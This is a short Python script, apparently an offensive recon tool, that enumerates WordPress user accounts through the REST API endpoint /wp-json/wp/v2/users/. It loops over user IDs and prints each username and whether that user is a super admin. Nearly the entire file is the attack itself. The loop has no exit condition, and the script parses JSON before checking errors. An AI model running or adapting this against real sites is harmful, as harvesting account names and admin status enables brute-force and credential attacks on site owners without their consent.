import requests
import sys

# Error
if len(sys.argv) <= 1:
    print('[-] Can\'t find any argument')
    exit()

# Main
userCount = 0

while True:
    userCount += 1
    get = requests.get(f'{sys.argv[1]}/wp-json/wp/v2/users/{userCount}')
    json = get.json()

    if get.status_code >= 400:
        pass

    else:
        print(f'[{userCount}] Username: {json["name"]}\n- Super Admin : {json["is_super_admin"]}\n- Expanded Url: {sys.argv[1]}/wp-json/wp/v2/users/{userCount}')
